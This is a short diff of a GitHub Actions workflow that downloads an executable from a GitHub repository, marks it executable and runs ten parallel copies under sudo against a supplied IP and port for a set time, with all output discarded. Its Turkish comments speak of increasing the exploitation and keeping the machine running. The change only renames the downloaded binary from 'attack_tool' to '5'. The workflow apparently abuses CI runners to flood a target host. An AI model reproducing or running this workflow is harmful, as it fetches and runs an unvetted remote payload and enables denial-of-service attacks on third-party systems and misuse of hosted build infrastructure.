@@ -30,8 +30,8 @@ jobs:
     steps:
       - name: Prep
         run: |
-          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O attack_tool
-          chmod +x attack_tool
+          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
+          chmod +x 5
           
       - name: Turbo Fire
         run: |
@@ -42,7 +42,7 @@ jobs:
           
           # Her makinede 10 paralel işlem başlat (Sömürüyü artır)
           for i in {1..10}; do
-            sudo timeout "$TIME_VAL" ./attack_tool "$IP" "$PORT" 500 1000 99999 "$TIME_VAL" > /dev/null 2>&1 &
+            sudo timeout "$TIME_VAL" ./5 "$IP" "$PORT" 500 1000 99999 "$TIME_VAL" > /dev/null 2>&1 &
           done
           
           # timeout komutu arka planda çalıştığı için makineyi uyutarak açık tutuyoruz
